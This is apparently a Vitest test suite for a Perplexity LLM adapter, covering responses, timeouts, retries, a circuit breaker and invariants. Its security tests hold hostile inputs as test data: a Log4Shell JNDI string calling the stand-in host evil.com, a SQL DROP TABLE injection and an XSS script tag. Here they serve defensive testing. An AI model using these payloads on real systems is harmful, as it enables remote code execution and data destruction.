import { describe, it, expect, beforeEach, vi, afterEach } from 'vitest';
import PerplexityAdapter from '../../src/core/providers/PerplexityAdapter.js';

// Mock OpenAI client (Perplexity uses OpenAI-compatible API)
const mockOpenAI = {
  chat: {
    completions: {
      create: vi.fn()
    }
  }
};

vi.mock('openai', () => ({
  default: vi.fn(() => mockOpenAI)
}));

describe('PerplexityAdapter', () => {
  let adapter;
  let originalEnv;

  beforeEach(() => {
    // Store original environment
    originalEnv = { ...process.env };
    
    // Set test environment
    process.env.PERPLEXITY_API_KEY = 'test-perplexity-key';
    process.env.PERPLEXITY_BASE_URL = 'https://api.perplexity.ai';
    process.env.PERPLEXITY_MODEL = 'pplx-7b-online';
    
    adapter = new PerplexityAdapter({
      timeoutMs: 100,
      maxRetries: 2,
      backoffBaseMs: 10
    });
    
    vi.clearAllMocks();
  });

  afterEach(() => {
    // Restore original environment
    process.env = originalEnv;
    vi.clearAllMocks();
  });

  describe('Constructor', () => {
    it('should initialize with Perplexity configuration', () => {
      expect(adapter.client).toBeDefined();
      expect(adapter.model).toBe('pplx-7b-online');
      expect(adapter.timeoutMs).toBe(100);
      expect(adapter.maxRetries).toBe(2);
    });

    it('should handle missing API key gracefully', () => {
      delete process.env.PERPLEXITY_API_KEY;
      expect(() => new PerplexityAdapter()).not.toThrow();
    });

    it('should use custom model from environment', () => {
      process.env.PERPLEXITY_MODEL = 'pplx-70b-online';
      const customAdapter = new PerplexityAdapter();
      expect(customAdapter.model).toBe('pplx-70b-online');
    });

    it('should use custom base URL from environment', () => {
      process.env.PERPLEXITY_BASE_URL = 'https://custom.perplexity.ai';
      const customAdapter = new PerplexityAdapter();
      expect(customAdapter.client).toBeDefined();
    });
  });

  describe('Success Cases', () => {
    it('should return valid decision for successful API call', async () => {
      const mockResponse = {
        choices: [{
          message: {
            content: '{"decision": true, "reasoning": "Evidence-based decision"}'
          }
        }]
      };
      
      mockOpenAI.chat.completions.create.mockResolvedValue(mockResponse);
      
      const result = await adapter.evaluate({
        type: 'evidence_check',
        payload: { query: 'test evidence' }
      });
      
      expect(result.decision).toBe(true);
      expect(result.reasoning).toBe('Evidence-based decision');
      expect(mockOpenAI.chat.completions.create).toHaveBeenCalledWith({
        model: 'pplx-7b-online',
        messages: [
          { role: 'system', content: 'Answer with a JSON: {"decision": true|false, "reasoning": "..."}' },
          { role: 'user', content: expect.stringContaining('evidence_check') }
        ],
        temperature: 0
      });
    });

    it('should handle false decision response', async () => {
      const mockResponse = {
        choices: [{
          message: {
            content: '{"decision": false, "reasoning": "Insufficient evidence found"}'
          }
        }]
      };
      
      mockOpenAI.chat.completions.create.mockResolvedValue(mockResponse);
      
      const result = await adapter.evaluate({
        type: 'fact_check',
        payload: { claim: 'unverified claim' }
      });
      
      expect(result.decision).toBe(false);
      expect(result.reasoning).toBe('Insufficient evidence found');
    });

    it('should handle research-based payload structures', async () => {
      const mockResponse = {
        choices: [{
          message: {
            content: '{"decision": true, "reasoning": "Research supports this claim"}'
          }
        }]
      };
      
      mockOpenAI.chat.completions.create.mockResolvedValue(mockResponse);
      
      const researchPayload = {
        topic: 'climate change',
        sources: ['scientific paper 1', 'research study 2'],
        timeframe: '2020-2024'
      };
      
      const result = await adapter.evaluate({
        type: 'research_validation',
        payload: researchPayload
      });
      
      expect(result.decision).toBe(true);
      expect(mockOpenAI.chat.completions.create).toHaveBeenCalledWith(
        expect.objectContaining({
          messages: expect.arrayContaining([
            expect.objectContaining({
              content: expect.stringContaining('research_validation')
            })
          ])
        })
      );
    });
  });

  describe('Error Cases', () => {
    it('should handle API timeout', async () => {
      mockOpenAI.chat.completions.create.mockImplementation(
        () => new Promise(resolve => setTimeout(resolve, 200))
      );
      
      const result = await adapter.evaluate({
        type: 'timeout_test',
        payload: {}
      });
      
      expect(result.decision).toBe(false);
      expect(result.reasoning).toContain('provider_error:timeout');
    });

    it('should handle API 429 rate limit error', async () => {
      const error = new Error('Rate limit exceeded');
      error.status = 429;
      mockOpenAI.chat.completions.create.mockRejectedValue(error);
      
      const result = await adapter.evaluate({
        type: 'rate_limit_test',
        payload: {}
      });
      
      expect(result.decision).toBe(false);
      expect(result.reasoning).toContain('provider_error:Rate limit exceeded');
    });

    it('should handle invalid JSON response', async () => {
      const mockResponse = {
        choices: [{
          message: {
            content: 'This response is not valid JSON format'
          }
        }]
      };
      
      mockOpenAI.chat.completions.create.mockResolvedValue(mockResponse);
      
      const result = await adapter.evaluate({
        type: 'invalid_json',
        payload: {}
      });
      
      expect(result.decision).toBe(false);
      expect(result.reasoning).toBe('parse_error');
    });

    it('should handle missing response content', async () => {
      const mockResponse = {
        choices: [{
          message: {}
        }]
      };
      
      mockOpenAI.chat.completions.create.mockResolvedValue(mockResponse);
      
      const result = await adapter.evaluate({
        type: 'missing_content',
        payload: {}
      });
      
      expect(result.decision).toBe(false);
      expect(result.reasoning).toBe('parse_error');
    });

    it('should handle empty choices array', async () => {
      const mockResponse = {
        choices: []
      };
      
      mockOpenAI.chat.completions.create.mockResolvedValue(mockResponse);
      
      const result = await adapter.evaluate({
        type: 'empty_choices',
        payload: {}
      });
      
      expect(result.decision).toBe(false);
      expect(result.reasoning).toBe('parse_error');
    });

    it('should handle network connectivity issues', async () => {
      const error = new Error('Network error');
      error.code = 'ENOTFOUND';
      mockOpenAI.chat.completions.create.mockRejectedValue(error);
      
      const result = await adapter.evaluate({
        type: 'network_test',
        payload: {}
      });
      
      expect(result.decision).toBe(false);
      expect(result.reasoning).toContain('provider_error:Network error');
    });
  });

  describe('Retry Logic', () => {
    it('should retry on transient failures', async () => {
      let callCount = 0;
      mockOpenAI.chat.completions.create.mockImplementation(() => {
        callCount++;
        if (callCount < 2) {
          throw new Error('Temporary service error');
        }
        return {
          choices: [{
            message: {
              content: '{"decision": true, "reasoning": "Success after retry"}'
            }
          }]
        };
      });
      
      const result = await adapter.evaluate({
        type: 'retry_test',
        payload: {}
      });
      
      expect(callCount).toBe(2);
      expect(result.decision).toBe(true);
      expect(result.reasoning).toBe('Success after retry');
    });

    it('should fail after max retries', async () => {
      mockOpenAI.chat.completions.create.mockRejectedValue(
        new Error('Persistent service error')
      );
      
      const result = await adapter.evaluate({
        type: 'max_retry_test',
        payload: {}
      });
      
      expect(result.decision).toBe(false);
      expect(result.reasoning).toContain('provider_error:Persistent service error');
      expect(mockOpenAI.chat.completions.create).toHaveBeenCalledTimes(3); // 1 + maxRetries
    });
  });

  describe('Circuit Breaker', () => {
    it('should open circuit after threshold failures', async () => {
      mockOpenAI.chat.completions.create.mockRejectedValue(
        new Error('Service unavailable')
      );
      
      // Trigger failures to open circuit
      for (let i = 0; i < 5; i++) {
        await adapter.evaluate({ type: 'circuit_test', payload: {} });
      }
      
      // Clear mock to reset call count
      mockOpenAI.chat.completions.create.mockClear();
      
      // Circuit should be open now
      const result = await adapter.evaluate({
        type: 'circuit_open_test',
        payload: {}
      });
      
      expect(result.decision).toBe(false);
      expect(result.reasoning).toBe('circuit_open');
      expect(mockOpenAI.chat.completions.create).toHaveBeenCalledTimes(0); // No new calls when circuit is open
    });
  });

  describe('Security & Injection Tests', () => {
    it('should handle malicious payload injection', async () => {
      const mockResponse = {
        choices: [{
          message: {
            content: '{"decision": false, "reasoning": "Suspicious query pattern detected"}'
          }
        }]
      };
      
      mockOpenAI.chat.completions.create.mockResolvedValue(mockResponse);
      
      const maliciousPayload = {
        query: '${jndi:ldap://evil.com/a}',
        injection: '; DROP TABLE queries; --'
      };
      
      const result = await adapter.evaluate({
        type: 'security_test',
        payload: maliciousPayload
      });
      
      expect(result.decision).toBe(false);
      expect(mockOpenAI.chat.completions.create).toHaveBeenCalledWith(
        expect.objectContaining({
          messages: expect.arrayContaining([
            expect.objectContaining({
              content: expect.stringContaining('security_test')
            })
          ])
        })
      );
    });

    it('should sanitize JSON parsing', async () => {
      const mockResponse = {
        choices: [{
          message: {
            content: '{"decision": true, "reasoning": "Valid", "extra": "malicious<script>alert(1)</script>"}'
          }
        }]
      };
      
      mockOpenAI.chat.completions.create.mockResolvedValue(mockResponse);
      
      const result = await adapter.evaluate({
        type: 'sanitization_test',
        payload: {}
      });
      
      expect(result.decision).toBe(true);
      expect(result.reasoning).toBe('Valid');
      // Should not include extra fields
      expect(result.extra).toBeUndefined();
    });
  });

  describe('Evidence-Based Decision Making', () => {
    it('should emphasize evidence in prompts', async () => {
      const mockResponse = {
        choices: [{
          message: {
            content: '{"decision": true, "reasoning": "Strong evidence supports this"}'
          }
        }]
      };
      
      mockOpenAI.chat.completions.create.mockResolvedValue(mockResponse);
      
      await adapter.evaluate({
        type: 'evidence_check',
        payload: { claim: 'test claim' }
      });
      
      expect(mockOpenAI.chat.completions.create).toHaveBeenCalledWith(
        expect.objectContaining({
          messages: expect.arrayContaining([
            expect.objectContaining({
              content: expect.stringContaining('evidence')
            })
          ])
        })
      );
    });

    it('should handle research queries', async () => {
      const mockResponse = {
        choices: [{
          message: {
            content: '{"decision": false, "reasoning": "No reliable sources found"}'
          }
        }]
      };
      
      mockOpenAI.chat.completions.create.mockResolvedValue(mockResponse);
      
      const result = await adapter.evaluate({
        type: 'research_query',
        payload: { topic: 'controversial topic' }
      });
      
      expect(result.decision).toBe(false);
      expect(result.reasoning).toBe('No reliable sources found');
    });
  });

  describe('Invariants', () => {
    it('INV-001: Should not contain hardcoded secrets', () => {
      const adapterCode = require('fs').readFileSync(
        '/Users/aminemohamed/Desktop/APP/PRISM INCUBATEUR/P.R.I.S.M/src/core/providers/PerplexityAdapter.js', 'utf8'
      );
      expect(adapterCode).not.toMatch(/pplx-[a-zA-Z0-9]{20,}/);
      expect(adapterCode).not.toMatch(/api[_-]?key[_-]?[=:]\s*['"][^'"]{10,}['"]/i);
    });

    it('INV-002: Should respect timeout constraint', () => {
      expect(adapter.timeoutMs).toBeLessThanOrEqual(300);
    });

    it('INV-003: Should reject invalid response schemas', async () => {
      const mockResponse = {
        choices: [{
          message: {
            content: '{"invalid": "schema", "missing_decision": true}'
          }
        }]
      };
      
      mockOpenAI.chat.completions.create.mockResolvedValue(mockResponse);
      
      const result = await adapter.evaluate({
        type: 'invalid_schema',
        payload: {}
      });
      
      expect(result.decision).toBe(false);
      expect(result.reasoning).toBe(''); // Empty string when decision is false and no reasoning field
    });

    it('INV-004: Should not make calls without API key', async () => {
      delete process.env.PERPLEXITY_API_KEY;
      const adapterNoKey = new PerplexityAdapter();
      
      const error = new Error('API key required');
      mockOpenAI.chat.completions.create.mockRejectedValue(error);
      
      const result = await adapterNoKey.evaluate({
        type: 'no_key_test',
        payload: {}
      });
      
      expect(result.decision).toBe(false);
      expect(result.reasoning).toContain('provider_error');
    });

    it('INV-005: Should use evidence-based prompting', async () => {
      const mockResponse = {
        choices: [{
          message: {
            content: '{"decision": true, "reasoning": "Evidence found"}'
          }
        }]
      };
      
      mockOpenAI.chat.completions.create.mockResolvedValue(mockResponse);
      
      await adapter.evaluate({
        type: 'evidence_test',
        payload: {}
      });
      
      expect(mockOpenAI.chat.completions.create).toHaveBeenCalledWith(
        expect.objectContaining({
          messages: expect.arrayContaining([
            expect.objectContaining({
              content: expect.stringContaining('evidence')
            })
          ])
        })
      );
    });
  });
});
